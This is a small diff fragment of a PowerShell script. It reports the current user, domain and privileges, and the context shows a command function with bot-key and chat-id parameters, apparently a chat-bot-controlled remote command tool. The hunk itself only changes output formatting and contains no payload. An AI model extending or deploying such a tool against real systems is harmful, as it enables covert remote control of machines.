@@ -162,7 +162,7 @@ $result = New-Object psobject -Property @{
 "Dominio" = "$env:USERDOMAIN"
 "Privilegios" = "$privilegios"
  }
- $result | Select-Object usuario, dominio, privilegios | FL
+ $result | Select-Object usuario, dominio, privilegios 
 }
 
 function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
